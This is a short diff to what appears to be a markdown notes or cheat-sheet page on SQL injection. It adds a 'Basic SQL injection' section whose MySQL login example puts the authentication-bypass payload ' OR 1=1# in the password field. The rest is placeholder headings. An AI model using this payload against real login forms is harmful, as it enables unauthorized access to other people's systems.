@@ -1,6 +1,12 @@
 ## Detection
 bla bla
 
+## Basic SQL injection
+```
+MySQL
+Username: Administrator
+Password: ' OR 1=1#
+```
 
 ## SQLserver
 
